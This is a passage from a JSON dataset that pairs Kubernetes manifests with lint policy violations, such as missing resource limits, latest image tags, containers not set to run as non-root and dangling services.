valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "9104",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "9105",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "9106",
    "manifest_path": "data/manifests/the_stack_sample/sample_3440.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    description: Settings provider\n  labels:\n    app: settings\n    environment: Development\n    tier: Service\n  name: settings\n  namespace: sirius\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: settings\n  template:\n    metadata:\n      labels:\n        app: settings\n      name: settings\n    spec:\n      containers:\n      - name: settings\n        image: docker.io/swisschains/settings-sirius-prod:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        readinessProbe:\n          httpGet:\n            path: /common\n            port: 5000\n          initialDelaySeconds: 10\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /common\n            port: 5000\n          initialDelaySeconds: 10\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 31m\n          limits:\n            memory: 128Mi\n            cpu: 125m\n        env:\n        - name: KEY_VALUE_STORAGE\n          valueFrom:\n            secretKeyRef:\n              name: settings\n              key: ConnectionString\n        - name: ENVIRONMENT_MODE\n          valueFrom:\n            secretKeyRef:\n              name: settings\n              key: ENVIRONMENT_MODE\n        - name: ENV_INFO\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"settings\" is using an invalid container image, \"docker.io/swisschains/settings-sirius-prod:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9107",
    "manifest_path": "data/manifests/the_stack_sample/sample_3440.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    description: Settings provider\n  labels:\n    app: settings\n    environment: Development\n    tier: Service\n  name: settings\n  namespace: sirius\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: settings\n  template:\n    metadata:\n      labels:\n        app: settings\n      name: settings\n    spec:\n      containers:\n      - name: settings\n        image: docker.io/swisschains/settings-sirius-prod:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        readinessProbe:\n          httpGet:\n            path: /common\n            port: 5000\n          initialDelaySeconds: 10\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /common\n            port: 5000\n          initialDelaySeconds: 10\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 31m\n          limits:\n            memory: 128Mi\n            cpu: 125m\n        env:\n        - name: KEY_VALUE_STORAGE\n          valueFrom:\n            secretKeyRef:\n              name: settings\n              key: ConnectionString\n        - name: ENVIRONMENT_MODE\n          valueFrom:\n            secretKeyRef:\n              name: settings\n              key: ENVIRONMENT_MODE\n        - name: ENV_INFO\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"settings\" does not have a read-only root file system"
  },
  {
    "id": "9108",
    "manifest_path": "data/manifests/the_stack_sample/sample_3440.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    description: Settings provider\n  labels:\n    app: settings\n    environment: Development\n    tier: Service\n  name: settings\n  namespace: sirius\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: settings\n  template:\n    metadata:\n      labels:\n        app: settings\n      name: settings\n    spec:\n      containers:\n      - name: settings\n        image: docker.io/swisschains/settings-sirius-prod:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        readinessProbe:\n          httpGet:\n            path: /common\n            port: 5000\n          initialDelaySeconds: 10\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /common\n            port: 5000\n          initialDelaySeconds: 10\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 31m\n          limits:\n            memory: 128Mi\n            cpu: 125m\n        env:\n        - name: KEY_VALUE_STORAGE\n          valueFrom:\n            secretKeyRef:\n              name: settings\n              key: ConnectionString\n        - name: ENVIRONMENT_MODE\n          valueFrom:\n            secretKeyRef:\n              name: settings\n              key: ENVIRONMENT_MODE\n        - name: ENV_INFO\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"settings\" is not set to runAsNonRoot"
  },
  {
    "id": "9109",
    "manifest_path": "data/manifests/the_stack_sample/sample_3442.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: api-svc\nspec:\n  type: ClusterIP\n  selector:\n    app: api\n  ports:\n  - protocol: TCP\n    port: 8080\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:api])"
  },
  {
    "id": "9110",
    "manifest_path": "data/manifests/the_stack_sample/sample_3444.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: workfinder-landsat8-wait\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: workfinder-landsat8-wait\n          image: satapps/workfinder:0.2.12\n          imagePullPolicy: IfNotPresent\n          command:\n          - python\n          - -m\n          - workfinder.wait_for_order\n          - landsat8\n          env:\n          - name: APP_REGION\n            value: Fiji\n          - name: AWS_BUCKET\n            value: public-eo-data\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              secretKeyRef:\n                name: s3-secrets\n                key: access-key\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              secretKeyRef:\n                name: s3-secrets\n                key: secret-key\n          - name: USGS_USERNAME\n            valueFrom:\n              secretKeyRef:\n                name: usgs-secrets\n                key: username\n          - name: USGS_PASSWORD\n            valueFrom:\n              secretKeyRef:\n                name: usgs-secrets\n                key: password\n          - name: NATS_URL\n            value: nats://something.something.com\n          - name: REDIS_HOST\n            value: redis-master.ard.svc.cluster.local\n          - name: REDIS_PORT\n            value: '6379'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"workfinder-landsat8-wait\" does not have a read-only root file system"
  },
  {
    "id": "9111",
    "manifest_path": "data/manifests/the_stack_sample/sample_3444.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: workfinder-landsat8-wait\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: workfinder-landsat8-wait\n          image: satapps/workfinder:0.2.12\n          imagePullPolicy: IfNotPresent\n          command:\n          - python\n          - -m\n          - workfinder.wait_for_order\n          - landsat8\n          env:\n          - name: APP_REGION\n            value: Fiji\n          - name: AWS_BUCKET\n            value: public-eo-data\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              secretKeyRef:\n                name: s3-secrets\n                key: access-key\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              secretKeyRef:\n                name: s3-secrets\n                key: secret-key\n          - name: USGS_USERNAME\n            valueFrom:\n              secretKeyRef:\n                name: usgs-secrets\n                key: username\n          - name: USGS_PASSWORD\n            valueFrom:\n              secretKeyRef:\n                name: usgs-secrets\n                key: password\n          - name: NATS_URL\n            value: nats://something.something.com\n          - name: REDIS_HOST\n            value: redis-master.ard.svc.cluster.local\n          - name: REDIS_PORT\n            value: '6379'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"workfinder-landsat8-wait\" is not set to runAsNonRoot"
  },
  {
    "id": "9112",
    "manifest_path": "data/manifests/the_stack_sample/sample_3444.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: workfinder-landsat8-wait\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: workfinder-landsat8-wait\n          image: satapps/workfinder:0.2.12\n          imagePullPolicy: IfNotPresent\n          command:\n          - python\n          - -m\n          - workfinder.wait_for_order\n          - landsat8\n          env:\n          - name: APP_REGION\n            value: Fiji\n          - name: AWS_BUCKET\n            value: public-eo-data\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              secretKeyRef:\n                name: s3-secrets\n                key: access-key\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              secretKeyRef:\n                name: s3-secrets\n                key: secret-key\n          - name: USGS_USERNAME\n            valueFrom:\n              secretKeyRef:\n                name: usgs-secrets\n                key: username\n          - name: USGS_PASSWORD\n            valueFrom:\n              secretKeyRef:\n                name: usgs-secrets\n                key: password\n          - name: NATS_URL\n            value: nats://something.something.com\n          - name: REDIS_HOST\n            value: redis-master.ard.svc.cluster.local\n          - name: REDIS_PORT\n            value: '6379'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"workfinder-landsat8-wait\" has cpu request 0"
  },
  {
    "id": "9113",
    "manifest_path": "data/manifests/the_stack_sample/sample_3444.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: workfinder-landsat8-wait\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: workfinder-landsat8-wait\n          image: satapps/workfinder:0.2.12\n          imagePullPolicy: IfNotPresent\n          command:\n          - python\n          - -m\n          - workfinder.wait_for_order\n          - landsat8\n          env:\n          - name: APP_REGION\n            value: Fiji\n          - name: AWS_BUCKET\n            value: public-eo-data\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              secretKeyRef:\n                name: s3-secrets\n                key: access-key\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              secretKeyRef:\n                name: s3-secrets\n                key: secret-key\n          - name: USGS_USERNAME\n            valueFrom:\n              secretKeyRef:\n                name: usgs-secrets\n                key: username\n          - name: USGS_PASSWORD\n            valueFrom:\n              secretKeyRef:\n                name: usgs-secrets\n                key: password\n          - name: NATS_URL\n            value: nats://something.something.com\n          - name: REDIS_HOST\n            value: redis-master.ard.svc.cluster.local\n          - name: REDIS_PORT\n            value: '6379'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"workfinder-landsat8-wait\" has memory limit 0"
  },
  {
    "id": "9114",
    "manifest_path": "data/manifests/the_stack_sample/sample_3445.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: jmeter-grafana\n  labels:\n    app: jmeter-grafana\nspec:\n  ports:\n  - port: 3000\n    targetPort: 3000\n  selector:\n    app: jmeter-grafana\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:jmeter-grafana])"
  },
  {
    "id": "9115",
    "manifest_path": "data/manifests/the_stack_sample/sample_3446.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod2\nspec:\n  containers:\n  - name: test-pod2\n    image: gcr.io/google_containers/busybox:1.24\n    command:\n    - sleep\n    args:\n    - '3600'\n    volumeMounts:\n    - name: nfs-pvc\n      mountPath: /mnt\n  volumes:\n  - name: nfs-pvc\n    persistentVolumeClaim:\n      claimName: test-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-pod2\" does not have a read-only root file system"
  },
  {
    "id": "9116",
    "manifest_path": "data/manifests/the_stack_sample/sample_3446.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod2\nspec:\n  containers:\n  - name: test-pod2\n    image: gcr.io/google_containers/busybox:1.24\n    command:\n    - sleep\n    args:\n    - '3600'\n    volumeMounts:\n    - name: nfs-pvc\n      mountPath: /mnt\n  volumes:\n  - name: nfs-pvc\n    persistentVolumeClaim:\n      claimName: test-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-pod2\" is not set to runAsNonRoot"
  },
  {
    "id": "9117",
    "manifest_path": "data/manifests/the_stack_sample/sample_3446.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod2\nspec:\n  containers:\n  - name: test-pod2\n    image: gcr.io/google_containers/busybox:1.24\n    command:\n    - sleep\n    args:\n    - '3600'\n    volumeMounts:\n    - name: nfs-pvc\n      mountPath: /mnt\n  volumes:\n  - name: nfs-pvc\n    persistentVolumeClaim:\n      claimName: test-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"test-pod2\" has cpu request 0"
  },
  {
    "id": "9118",
    "manifest_path": "data/manifests/the_stack_sample/sample_3446.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod2\nspec:\n  containers:\n  - name: test-pod2\n    image: gcr.io/google_containers/busybox:1.24\n    command:\n    - sleep\n    args:\n    - '3600'\n    volumeMounts:\n    - name: nfs-pvc\n      mountPath: /mnt\n  volumes:\n  - name: nfs-pvc\n    persistentVolumeClaim:\n      claimName: test-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-pod2\" has memory limit 0"
  },
  {
    "id": "9119",
    "manifest_path": "data/manifests/the_stack_sample/sample_3448.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: jenkins-operator\nspec:\n  selector:\n    app: jenkins-operator\n  ports:\n  - port: 80\n    targetPort: 8080\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:jenkins-operator])"
  },
  {
    "id": "9120",
    "manifest_path": "data/manifests/the_stack_sample/sample_3449.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: coredns\n  namespace: kube-system\n  labels:\n    k8s-app: kube-dns\n    kubernetes.io/name: CoreDNS\n    addonmanager.kubernetes.io/mode: Reconcile\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kube-dns\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-dns\n    spec:\n      serviceAccountName: coredns\n      containers:\n      - name: coredns\n        image: k8s.gcr.io/coredns:1.1.3\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            memory: 170Mi\n          requests:\n            cpu: 100m\n            memory: 70Mi\n        args:\n        - -conf\n        - /etc/coredns/Corefile\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/coredns\n          readOnly: true\n        ports:\n        - containerPort: 53\n          name: dns\n          protocol: UDP\n        - containerPort: 53\n          name: dns-tcp\n          protocol: TCP\n        - containerPort: 9153\n          name: metrics\n          protocol: TCP\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n      volumes:\n      - name: config-volume\n        configMap:\n          name: coredns\n          items:\n          - key: Corefile\n            path: Corefile\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"coredns\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "9121",
    "manifest_path": "data/manifests/the_stack_sample/sample_3449.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: coredns\n  namespace: kube-system\n  labels:\n    k8s-app: kube-dns\n    kubernetes.io/name: CoreDNS\n    addonmanager.kubernetes.io/mode: Reconcile\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kube-dns\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-dns\n    spec:\n      serviceAccountName: coredns\n      containers:\n      - name: coredns\n        image: k8s.gcr.io/coredns:1.1.3\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            memory: 170Mi\n          requests:\n            cpu: 100m\n            memory: 70Mi\n        args:\n        - -conf\n        - /etc/coredns/Corefile\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/coredns\n          readOnly: true\n        ports:\n        - containerPort: 53\n          name: dns\n          protocol: UDP\n        - containerPort: 53\n          name: dns-tcp\n          protocol: TCP\n        - containerPort: 9153\n          name: metrics\n          protocol: TCP\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n      volumes:\n      - name: config-volume\n        configMap:\n          name: coredns\n          items:\n          - key: Corefile\n            path: Corefile\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"coredns\" not found"
  },
  {
    "id": "9122",
    "manifest_path": "data/manifests/the_stack_sample/sample_3449.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: coredns\n  namespace: kube-system\n  labels:\n    k8s-app: kube-dns\n    kubernetes.io/name: CoreDNS\n    addonmanager.kubernetes.io/mode: Reconcile\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kube-dns\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-dns\n    spec:\n      serviceAccountName: coredns\n      containers:\n      - name: coredns\n        image: k8s.gcr.io/coredns:1.1.3\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            memory: 170Mi\n          requests:\n            cpu: 100m\n            memory: 70Mi\n        args:\n        - -conf\n        - /etc/coredns/Corefile\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/coredns\n          readOnly: true\n        ports:\n        - containerPort: 53\n          name: dns\n          protocol: UDP\n        - containerPort: 53\n          name: dns-tcp\n          protocol: TCP\n        - containerPort: 9153\n          name: metrics\n          protocol: TCP\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n      volumes:\n      - name: config-volume\n        configMap:\n          name: coredns\n          items:\n          - key: Corefile\n            path: Corefile\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"coredns\" is not set to runAsNonRoot"
  },
  {
    "id": "9123",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
